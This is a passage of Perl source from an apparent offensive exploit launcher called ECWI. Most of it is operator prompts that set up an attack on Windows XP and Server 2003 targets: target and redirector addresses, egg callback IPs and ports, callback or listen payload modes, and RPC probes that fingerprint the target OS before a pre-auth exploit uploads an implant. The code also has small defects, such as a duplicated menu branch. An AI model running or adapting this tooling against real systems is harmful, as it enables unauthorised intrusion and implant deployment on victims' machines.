        			&EU_Log(0, "Enter new time-out value (greater than 60):  $CallinTimeoutValue");
        		}

			} # End payload Listen

			# ---------------------------------------------------------------
			# CALLBACK PAYLOAD
			# ---------------------------------------------------------------
			
			else
			{
				# ---------------------------------------------------------------
				# Get Call-Back Socket Options
				# ---------------------------------------------------------------
	
				($ImplantSocketStatus, $EggSocketStatus) = &get_socket_options($ImplantSocketStatus, $EggSocketStatus, 
																			   $PayloadType);
	
				if( $EggSocketStatus eq $::EGG_SOCKET_NEW) 
				{
					# ---------------------------------------------------------------
					# Get Egg Callback IP Address and Port
					# ---------------------------------------------------------------
	
					&EU_Log(1, "\nThe ECWI Exploit Payload must callback in order to upload the Implant Payload.");
	
					# Use Local IP for Egg Callback
					&EU_Log(1, "The local IP Address should be used as the Egg callback IP Address.");
	
					$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback IP Address", $LocalIp);
					&EU_Log(0, "Enter the Egg callback IP Address:  $EggCallbackIp");
	
					# Prompt for Egg Callback Port
					$EggCallbackPort = $DestinationPort * 10 + 1;
					while(1) 
					{
						$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
						&EU_Log(0, "Enter the Egg callback Port:  $EggCallbackPort");
					
						if($EggCallbackPort eq "0") 
						{
							&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
						next;
						}
						last;
					} # while(1) payload selection
				} #End callback Listen
			} # End payload Callback
		} # End redirection False
		# ---------------------------------------------------------------
		# REDIRECTION TRUE
		# ---------------------------------------------------------------

		else 
		{

			# ---------------------------------------------------------------
			# Get Redirection IP Address and Port (to which to deliver the exploit)
			# Use Loopback IP Address
			# ---------------------------------------------------------------


			$LPRedirectionIp = &EU_GetIP("\nEnter the LP Redirection IP address", $LPRedirectionIp);
			&EU_Log(0, "Enter the LP Redirection IP address:  $LPRedirectionIp");
			$TargetIp = $LPRedirectionIp;

			$LPRedirectionPort = $DestinationPort * 10;
			
			# Get the Redirector Port
			&EU_Log(1, "\nECWI must be re-directed to the Target on port $DestinationPort");
			$LPRedirectionPort = &EU_GetPort("Enter the LP Redirection Port No.", $LPRedirectionPort);
		
			&EU_Log(0,"Enter the LP Redirection Port No.: $LPRedirectionPort");

			# Get NBT Server IP Address
			$TargetServerIp = &EU_GetIP("\nEnter the Server's IP address (AKA: the Actual Target's IP Address)", $DestinationIp);
			&EU_Log(0,"Enter the Server's IP address: $TargetServerIp");

			$TargetPort = $LPRedirectionPort;

			# ---------------------------------------------------------------
			# Get Payload Type
			# ---------------------------------------------------------------

			$callbackFlag = &get_payload_type($callbackFlag);

			# ---------------------------------------------------------------
			# LISTEN PAYLOAD
			# ---------------------------------------------------------------

			if( $callbackFlag eq $::PAYLOAD_LISTEN) 
			{
				# Prompt for Egg Listen Port
				while(1) 
				{
					$EggListenPort = &EU_GetPort("\nEnter the Listen Port", $EggListenPort);
					&EU_Log(0, "Enter the Listen Port:  $EggListenPort");
				
					if($EggListenPort eq "0") 
					{
						&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
					next;
					}
					last;
				} # while(1) payload selection

				# Prompt for Egg Call In Port
				while(1) 
				{
					$EggCallInPort = &EU_GetPort("\nEnter the Call In Port", $EggCallInPort);
					&EU_Log(0, "Enter the Call In Port:  $EggCallInPort");
				
					if($EggCallInPort eq "0") 
					{
						&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
					next;
					}
					last;
				} # while(1) payload selection
				
        		# ---------------------------------------------------------------
        		# Prompt for socket time-out value
        		# ---------------------------------------------------------------

        		&EU_Log(1, "\nThe default time-out value before the CALL IN connection is made is 60 sec.");
        		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
        		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
        		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

        		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
        			$CallinTimeoutValue = "60";
        		}
        		else {
        			$CallinTimeoutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
        			&EU_Log(0, "Enter new time-out value (greater than 60):  $CallinTimeoutValue");
        		}

			} # End payload Listen

			# ---------------------------------------------------------------
			# CALLBACK PAYLOAD
			# ---------------------------------------------------------------
			
			else
			{
				# ---------------------------------------------------------------
				# Get Call-Back Socket Options
				# ---------------------------------------------------------------
	
				($ImplantSocketStatus, $EggSocketStatus) = &get_socket_options($ImplantSocketStatus, $EggSocketStatus, $PayloadType);
	
				if( $EggSocketStatus eq $::EGG_SOCKET_NEW) {
	
					# ---------------------------------------------------------------
					# Get Egg Callback IP Address and Port
					# ---------------------------------------------------------------
	
					&EU_Log(1, "\n");
					&EU_Log(1, "*************************************************************************");
					&EU_Log(1, "* The ECWI Exploit Payload must callback in order to upload the Implant *");
					&EU_Log(1, "* Payload.  The callback IP Address MUST be that of the Middle          *");
					&EU_Log(1, "* Redirector.  The callback Port MUST be the same number on both the    *");
					&EU_Log(1, "* Middle Redirector and the local machine, else redirection will fail.  *");
					&EU_Log(1, "* The local machine uses this port to listen for the callback, and the  *");
					&EU_Log(1, "* ECWI Exploit Payload uses it to call back to the local machine        *");
					&EU_Log(1, "* through the Redirector.                                               *");
					&EU_Log(1, "*************************************************************************");
	
					# Use Middle Redirector IP Address for Callback
					$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback(Middle Redirector) IP ", $EggCallbackIp);
					&EU_Log(0, "Enter the Egg callback(Middle Redirector) IP Address:  $EggCallbackIp");
	
					# Prompt for Egg Callback Port
					$EggCallbackPort = $DestinationPort * 10 + 1;
					while(1) {
						$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
						&EU_Log(0, "Enter the Egg callback Port:  $EggCallbackPort");
						if($EggCallbackPort eq "0") {
							&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
							next;
						}
						last;
					} # while(1) payload selection
				}
			} # End payload Callback
		}

		# ---------------------------------------------------------------
		# Prompt for socket time-out value
		# ---------------------------------------------------------------

		&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
			$TimeOutValue = "60";
		}
		else {
			$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
			&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
		}


		# ---------------------------------------------------------------
		# Confirm Network Parameters
		# ---------------------------------------------------------------

		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tLocal IP              : $LocalIp");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
			&EU_Log(1,"\tTarget IP             : $DestinationIp");
			&EU_Log(1,"\tTarget Port           : $DestinationPort");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				if( $callbackFlag eq $::PAYLOAD_LISTEN) {
					&EU_Log(1,"\tListen Port     : $EggListenPort");
					&EU_Log(1,"\tCall In Port     : $EggCallInPort");
					&EU_Log(1,"\tCall In Timeout  : $CallinTimeoutValue");
				}
				else {
					&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
					&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
				}
			}
			else {
				if( $callbackFlag eq $::PAYLOAD_LISTEN) {
					&EU_Log(1,"\tListen Port     : $EggListenPort");
					&EU_Log(1,"\tCall In Port     : $EggCallInPort");
					&EU_Log(1,"\tCall In Timeout  : $CallinTimeoutValue");
				}
				else {
					&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
					&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
				}
			}
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain (Use existing connection for the entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close (Existing connection will NOT be used for the entire operation.)");
		}


		&EU_Log(1,"\tTransport Protocol    : $TransportProtocol");
		&EU_Log(1,"\tApplication Protocol  : $ApplicationProtocol");
		&EU_Log(1,"\tRpc Connection flag   : $RpcConnection");
		
		&EU_Log(1,"\tNetwork Time Out      : $TimeOutValue sec");
        #
        # Exploit is completely pre-auth, no creds required.
        #
#		if($UsingPassword == 1)
#		{
#			&EU_Log(1,"\tUsername              : $Username");
#			&EU_Log(1,"\tPassword              : $Password");
#		}
#
#		if($UsingPassword == 2)
#		{
#			&EU_Log(1,"\tUsername              : $Username");
#			&EU_Log(1,"\tNTLM password hash    : $NTHash");
#			&EU_Log(1,"\tLANMAN password hash  : $LMHash");
#		}


		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			; # continue on to probes section
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}


		# ---------------------------------------------------------------
		# Probe Target First
		# To Do: probe the target within the touch_tool subroutine (if applicable)
		#
		# ---------------------------------------------------------------

		my $touchFlag			= "n";		# Reset this value everytime we enter the probe section
		$WindowsVersion			= $not;		# Reset this value everytime we enter the probe section

		#Use rpctouch2 to obtain os and service pack.
		if($TransportProtocolSelected eq "1" || $TransportProtocolSelected eq "2")
		{
			#Check the windows Version

			&EU_Log(1, "\nCurrent supported targets are XP-SP2, XP-SP3, 2K3-SP1, 2K3-SP2.");
			$touchFlag = &EU_GetInput("\nUse RPCTOUCH touch option to obtain the Windows Version ([y],n)? ", "y");
			&EU_Log(0, "\nUse RPCTOUCH touch option to obtain the Windows Version ([y],n)? $touchFlag");
			
			if(($touchFlag eq "y") or ($touchFlag eq "Y")) 
			{

				# ---------------------------------------------------------------
				# RPCTOUCHII_RUN_GENERAL_PROBE ## General Windows Probe
				# ---------------------------------------------------------------

				($WindowsVersion, $bError) = &launch_rpctouchii($root_dir,$TargetIp,$TargetPort,
					$RPCTOUCHII_RUN_GENERAL_PROBE, $TargetTransportProtocol, 
					$TargetApplicationProtocol, $TargetServerIp, $TimeOutValue, $WindowsVersion);

		
		
    			# Parse Initial Touch Results
				## Note over smb you don't need the second run because you know the difference between xp and 2003
				#if( ($WindowsVersion == $::TARGET_VER_XP) and ($bError == 0) and ($ApplicationProtocol eq "NA")) 
				#{
				#	($WindowsVersion, $bError) = &launch_rpctouchii($root_dir,$TargetIp,$TargetPort, $RPCTOUCHII_RUN_WINDOWS_2003_PROBE, $TargetTransportProtocol, $TargetApplicationProtocol, $TargetServerIp, $TimeOutValue);
				#}

				if( ($bError == 1) or ($WindowsVersion eq $::TARGET_VER_UNKNOWN) ) 
				{

					# ---------------------------------------------------------------
					# ERRORS
					# ---------------------------------------------------------------

					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
					&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
						&EU_ExitMessage(1,"User terminated script\n");
					}
					elsif( ($continue eq "n") or ($continue eq "N") ) {
						&EU_Log(1, "Returning to top of script...\n");
						next;
					}
					else { # User elected to ignore probe results and continue with exploit anyway
						$touchFlag = "N";
					}
				}
            }
			
			# Select/Verify Target Version from Menu
			else{
                
				&EU_Log(1,"\nSelect the target Windows Version:\n");
				&EU_Log(1,"   1) $wxpsp2 **default**");		# 2. Windows XP-SP2
				&EU_Log(1,"   2) $wxpsp3");		# 2. Windows XP-SP2
				&EU_Log(1,"   3) $ws2003sp1");	# 1. Windows Server 2003-SP1
  				&EU_Log(1,"   4) $ws2003sp2");	# 1. Windows Server 2003-SP2
  				&EU_Log(1,"   5) $w2ksp4");	# 1. Windows Server 2004-SP4

				while(1) 
				{
					$retcode = &EU_GetInput("\nEnter selection : [1] ", "1" );
					&EU_Log(0, "\nEnter selection : $retcode");
					if($retcode == 1) 
					{
						#$WindowsVersion = $::TARGET_VER_2K3; 	
						$WindowsVersion = $wxpsp2;
					}
					elsif($retcode == 2) 
					{
						#$WindowsVersion = $::TARGET_VER_XP;
						$WindowsVersion = $wxpsp3;
						
					}
					elsif($retcode == 3) 
					{
						#$WindowsVersion = $::TARGET_VER_XP;
						$WindowsVersion = $ws2003sp1;
						
					}
					elsif($retcode == 4) 
					{
						#$WindowsVersion = $::TARGET_VER_XP;
						$WindowsVersion = $ws2003sp2;
						
					}
					elsif($retcode == 4) 
					{
						#$WindowsVersion = $::TARGET_VER_2K;
						$WindowsVersion = $w2ksp4;
						
					}
					else 
					{
						&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
						next;
					}
					last;				
				} #End while(1)
			
			} #Got/confirmed operating system

            #If we found windows 2003 sp2, get a language from the operator.
#            if(($WindowsVersion eq $ws2003sp2) or ($WindowsVersion eq $ws2003sp1))
#            {
#                &EU_Log(1,"\nSelect the target OS Language:");
#                &EU_Log(1,"   1) English");
#                &EU_Log(1,"   2) Other");
#                while(1)
#                {
#                    $retcode = &EU_GetInput("\nEnter selection : [1] ", 1);
#                    &EU_Log(0, "\nEnter selection : [1] ", 1);
#                    if($retcode == 1)
#                    {
#                        $WindowsVersion = $WindowsVersion."English";
#                    }
#                    elsif($retcode == 2)
#                    {
#                        $WindowsVersion = $WindowsVersion."Other";
#                    }
#                    else
#                    {
#                        &EU_Log(1, "\nInvalid option. Try again.");
#                        next;
#                    }
#                    last;
#                }
#            }
        }

#			#######################################
#			# Find the ephemeral port
#			#######################################
#
#           $touchFlag = &EU_GetInput("\nUse RPCTOUCH to find ephemeral port number? ([y],n)? ", "y");
#			&EU_Log(0, "\nUse RPCTOUCH to find ephemeral port number? ([y],n)? $touchFlag");
#			
#			my $attackPort = 0;
#
#			if(($touchFlag eq "y") or ($touchFlag eq "Y") or ($touchFlag eq "yes") or ($touchFlag eq "YES")) 
#			{
#				($attackPort, $bError) = &launch_rpctouchii($root_dir,$TargetIp,$TargetPort, 
#					$RPCTOUCHII_RUN_RPC_INTERFACE_PORT, $TargetTransportProtocol, $TargetApplicationProtocol, 
#					$TargetServerIp, $TimeOutValue);
#
#			
#				if($attackPort == 0) 
#				{
#
#					# ---------------------------------------------------------------
#					# ERRORS
#					# ---------------------------------------------------------------
#
#					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
#					&EU_Log(1, "\nThis error could be occuring for serveral reasons:");
#					&EU_Log(1, "\n1) The Target is not running the at service \n\t- (this attack vector is not available)");
#					&EU_Log(1, "\n2) The Target is either an XP SP2 or 2003 SP1\n\t - (not vulnerable to this exploit)");
#
#					$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
#					&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");
#
#					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
#						&EU_ExitMessage(1,"User terminated script\n");
#					}
#					elsif( ($continue eq "n") or ($continue eq "N") ) {
#						&EU_Log(1, "Returning to top of script...\n");
#						next;
#					}
#					else { # User elected to ignore probe results and continue with exploit anyway
#						$touchFlag = "N";
#					}
#				}# Error
#
#			} # User said Yes
#
#
#			# Confirm Results
#			if( $redirectFlag == 0 ) 
#			{
#
#				$attackPort = &EU_GetInput("\nEnter the Target port: [$attackPort] ", $attackPort);
#				&EU_Log(0,"\nTarget Port: $attackPort");
#				#This makes more sense for Redirection
#				$DestinationPort = $attackPort;
#				$TargetPort = $attackPort;
#			}
#			else
#			{	
#				&EU_Log(1,"NOTE:  The exploit needs to be sent to port $attackPort on the target machine!!!");
#				&EU_Log(1,"SINCE YOU ARE USING REDIRECTION YOU MUST SET UP THE REDIRECTOR FOR THIS PORT");
#				if( $attackPort < 6500)
#				{
#					$LPRedirectionPort = ($attackPort * 10 + 1);
#				}
#				else
#				{
#					$LPRedirectionPort = ($attackPort  + 11);
#				}
#				$LPRedirectionPort = &EU_GetInput("\nEnter the Redirection port: [$LPRedirectionPort] ", $LPRedirectionPort);
#				$DestinationPort = $attackPort;
#				$TargetPort = $LPRedirectionPort;
#				&EU_Log(0,"\tTarget Port: $LPRedirectionPort");
#			}
#		
#			$touchFlag = &EU_GetInput("\nUse ECWI touch option to test for vulnerability ([y],n)? ", "y");
#			&EU_Log(0,"nUse ECWI touch option to test for vulnerability ([y],n)?$touchFlag");
#											
#		} #Over Ephemeral port
#		else # over named pipes
#		{
#
#			$touchFlag = &EU_GetInput("\nUse ECWI touch option to obtain the Windows Version ([y],n)? ", "y");
#			&EU_Log(0," \nUse ECWI touch option to obtain the Windows Version ([y],n)? $touchFlag");
#
#		}
#		if(($touchFlag eq "y") or ($touchFlag eq "Y") or ($touchFlag eq "yes") or ($touchFlag eq "YES")) 
#		{
#
#
#			# ---------------------------------------------------------------
#			# ECWI Touch
#
#			($WindowsVersion, $bVulnerable, $bError) = &run_ecwitouch($root_dir,$TargetIp,$TargetPort,$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $TargetServerIp, $TimeOutValue,$touch,$Username, $Password, $NTHash, $LMHash );
#
#			# Parse Initial Touch Results
#			#If XP and used usernames we need to do further testing for servicepack
#			if(($WindowsVersion eq $wxp) && ($UsingPassword != 0 ))
#			{
#				$touch = $::RUN_PROBE_3;
#				($WindowsVersion, $bVulnerable, $bError) = &run_ecwitouch($root_dir,$TargetIp,$TargetPort,$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $TargetServerIp, $TimeOutValue,$touch,$Username, $Password, $NTHash, $LMHash );
#
#			}
#
#			if( ($WindowsVersion eq $not) or ($bVulnerable == 0) or ($bError == 1) ) 
#			{
#
#				# ---------------------------------------------------------------
#				# ERRORS
#
#				&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
#				$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
#				&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");
#
#				if( ($continue eq "q") or ($continue eq "Q") or ($continue eq "quit") or ($continue eq "QUIT") ) 
#				{
#					&EU_ExitMessage(1,"User terminated script\n");
#				}
#				elsif( ($continue eq "n") or ($continue eq "N") or ($continue eq "no") or ($continue eq "NO") ) 
#				{
#					&EU_Log(1, "Returning to top of script...\n");
#					next;
#				}
#				else 
#				{ # User elected to ignore probe results and continue with exploit anyway
#					$touchFlag = "n";
#				}
#			}
#			else {
#
#				# ---------------------------------------------------------------
#				# SUCCESS
#
#				$retcode = &EU_GetInput("\nUse \"$WindowsVersion\" as the target Windows Version ([y],n)? ", "y");
#				&EU_Log(0,"\nUse \"$WindowsVersion\" as the target Windows Version ([y],n)? $retcode");
#				if( ($retcode eq "n") or ($retcode eq "N") or ($retcode eq "no") or ($retcode eq "NO") ) 
#				{
#					$retcode = &EU_GetInput("\n*CAUTION* Are you CERTAIN that you wish to defy the probe results (y,[n])? ", "n");
#					&EU_Log(0,"\n*CAUTION* Are you CERTAIN that you wish to defy the probe results (y,[n])? $retcode");
#
#					if( ($retcode eq "n") or ($retcode eq "N") or ($retcode eq "no") or ($retcode eq "NO") ) 
#					{
#						&EU_Log(1,"Good. Using probe results for the target machine type.\n");
#					}
#					else 
#					{
#						while(1)
#						{
#							&EU_Log(1,"Select Windows Version:\n");
#							if($touch eq $::RUN_PROBE_1) 
#							{
#								&EU_Log(1,"\t2) Windows NT4\n\t3) Windows 2000");
#								
#							}
#							&EU_Log(1,"\t4) Windows XP (SP1 and below)\n\t5) Windows Server 2003 (base release)\n");
#							$WindowsVersion = &EU_GetInput("\nSelect Windows Version: ", "3");
#							&EU_Log(0,"\nSelect Windows Version: $WindowsVersion");
#							if(!(($WindowsVersion eq "2") or ($WindowsVersion eq "3") or ($WindowsVersion eq "4") or ($WindowsVersion eq "5"))) 
#							{
#								next;
#							}
#							else
#							{
#								if($WindowsVersion eq 2)
#								{
#									$WindowsVersion = $nt4;
#								}
#								elsif($WindowsVersion eq 3)
#								{
#									$WindowsVersion = $w2k;
#								}
#								elsif($WindowsVersion eq 4)
#								{
#									$WindowsVersion = $wxp;
#								}
#								elsif($WindowsVersion eq 5)
#								{
#									$WindowsVersion = $ws2003;
#								}
#					
#							}
#							last;
#
#						}#end while		
#					}
#				}
#			}
#
#		}
#		else {
#			&EU_Log(1,"Select Windows Version:\n");
#			if($touch ne $::RUN_PROBE_2) {
#				&EU_Log(1,"\t2) Windows NT4\n\t3) Windows 2000");
#			}
#			&EU_Log(1,"\t4) Windows XP (SP1 and below)\n\t5) Windows Server 2003 (base release)\n");
#			$WindowsVersion = &EU_GetInput("\nSelect Windows Version: ", "3");
#			&EU_Log(0,"\nSelect Windows Version: $WindowsVersion");
#			if(!(($WindowsVersion eq "2") or ($WindowsVersion eq "3") or ($WindowsVersion eq "4") or ($WindowsVersion eq "5"))) {
#				&EU_Log(1, "Invalid Windows selection.\nReturning to top of script...\n");
#				next;
#			}
#		}


		# ---------------------------------------------------------------
		# Check Socket Reuse vs. Windows NT 4.0
		#if(($EggSocketStatus eq $::EGG_SOCKET_REUSE) and ($WindowsVersion eq $nt4)) {
		#	&EU_Log(1, "\nERROR: Egg socket option REUSE is not supported on $nt4.");
		#	&EU_Log(1, "Please select the option to create a NEW socket.");
		#	next;
		#}


		# ---------------------------------------------------------------
		# Confirm Network Parameters
		# To Do: redisplay Confirm Network Parameters
		# ---------------------------------------------------------------

		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tLocal IP              : $LocalIp");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
		&EU_Log(1,"\tTarget IP             : $DestinationIp");
		&EU_Log(1,"\tTarget Port           : $DestinationPort");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
			}
			else {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp");
			}
			&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain (Use existing connection for the entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close (Existing connection will NOT be used for the entire operation.)");
		}


		&EU_Log(1,"\tTransport Protocol    : $TransportProtocol");
		&EU_Log(1,"\tApplication Protocol  : $ApplicationProtocol");
		&EU_Log(1,"\tRpc Connection flag   : $RpcConnection");
		
		&EU_Log(1,"\tNetwork Time Out      : $TimeOutValue sec");
#		if($UsingPassword == 1)
#		{
#			&EU_Log(1,"\tUsername              : $Username");
#			&EU_Log(1,"\tPassword              : $Password");
#		}

#		if($UsingPassword == 2)
#		{
#			&EU_Log(1,"\tUsername              : $Username");
#			&EU_Log(1,"\tNTLM password hash    : $NTHash");
#			&EU_Log(1,"\tLANMAN password hash  : $LMHash");
#		}

		&EU_Log(1,"\tWindows Version       : $WindowsVersion");


		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			last;
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}

	} # end while


	# ---------------------------------------------------------------
	# Convert $WindowsVersion from Text Name to Numeral
	#
	#if( ($WindowsVersion eq $nt4) or ($WindowsVersion eq "2")) { $WindowsVersion = 2; }
	#elsif( ($WindowsVersion eq $w2k) or ($WindowsVersion eq "3")) { $WindowsVersion = 3; }
	#elsif( ($WindowsVersion eq $wxp) or ($WindowsVersion eq "4")) { $WindowsVersion = 4; }
	#elsif( ($WindowsVersion eq $ws2003) or ($WindowsVersion eq "5")) { $WindowsVersion = 5; }
	#else {$WindowsVersion = 0;}

	# ---------------------------------------------------------------
	# Return
	# ---------------------------------------------------------------
	return ($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
	        $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
			$EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
			$WindowsVersion, $TargetServerIp,$Username, $Password, $NTHash, $LMHash, $callbackFlag, $EggListenPort, $EggCallInPort, $CallinTimeoutValue);
}






##############################################################################
#
#			G E T _ S O C K E T _ O P T I O N S
#
# Parameters:
#	$_[0] = ImplantSocketStatus
#	$_[1] = EggSocketStatus
#	$_[2] = PayloadType
#
# Returns:
#	Error code: 0 == No Error; 1 == Error.
#
# Globals:
#	$ExploitUtils::EU_LOG
#	$ExploitUtils::EU_EXITMESSAGE
#
# Program assumes that appropriate values for each of the specified input
# parameters were already validated.
#

sub get_socket_options()
{
	my ($ImplantSocketStatus, $EggSocketStatus, $PayloadType) = @_;

	my $opt;

	# ---------------------------------------------------------------
	# Get Egg Socket Option

	&EU_Log(1,"\nThe ECWI Exploit Payload Must Call-back in Order to Upload the Implant Payload.");

	$EggSocketStatus = $::EGG_SOCKET_NEW;
	$ImplantSocketStatus = $::IMPLANT_SOCKET_MAINTAIN;
	return ($ImplantSocketStatus, $EggSocketStatus);
}


##############################################################################
#
#			G E T _ PAYLOAD _ T Y P E
#
# Parameters:
#	$_[0] = callbackFlag
#
# Returns:
#	Error code: 0 == No Error; 1 == Error.
#
# Globals:
#
# Program assumes that appropriate values for each of the specified input
# parameters were already validated.
#

sub get_payload_type()
{
	my $retcode;
	# ---------------------------------------------------------------
	# Prompt for CALLBACK
	# ---------------------------------------------------------------
	$retcode = &EU_GetInput("\nWill this operation be CALLBACK ([y],n)? ", "y");
	&EU_Log(0, "\nWill this operation be CALLBACK ([y],n)? $retcode");

	if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) 
	{ 
			$callbackFlag = $::PAYLOAD_CALLBACK; 
	}
	else 
	{ 
			$callbackFlag = $::PAYLOAD_LISTEN;
	}

	return ($callbackFlag);
}


##############################################################################
#
#			R U N _ E L V T O U C H
#
# Parameters:
#	$_[0] = Root Directory
#	$_[1] = Target IP
#	$_[2] = Target Port
#	$_[3] = TargetTransportProtocol
#	$_[4] = TargetApplicationProtocol
#	$_[5] = RpcConnection
#	$_[6] = TargetServerIp
#	$_[7] = TimeOutValue
#	$_[8] = touchType
#	$_[9] = Username
#	$_[10] = Password
#	$_[11] = NTHash
#	$_[12] = LMHash
#
#			OS versions
#
#	$not		= "NOT GOOD";
#	$w9x		= "Windows 9x";
#	$nt4		= "Windows NT 4.0";
#	$w2k		= "Windows 2000";
#	$w2ksp0123	= "Windows 2000 Service Pack 0, 1, 2, or 3";
#	$w2ksp4		= "Windows 2000 Service Pack 4";
#	$wxp		= "Windows XP";
#	$wxpsp0		= "Windows XP Service Pack 0";
#	$wxpsp1		= "Windows XP Service Pack 1";
#	$wxpsp2		= "Windows XP Service Pack 2";
#	$w2kXp		= "Windows 2000 XP" ;
#	$wxp2003	= "Windows XP Server 2003" ;
#	$ws2003		= "Windows Server 2003";
#	$ws2003sp1	= "Windows Server 2003 Service Pack 1";
#
# Returns:
#	Error code: 0 == No Error; 1 == Error.
#
# Globals:
#	$ExploitUtils::EU_LOG
#	$ExploitUtils::EU_EXITMESSAGE
#
# Program assumes that appropriate values for each of the specified input
# parameters were already validated.
#
#   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
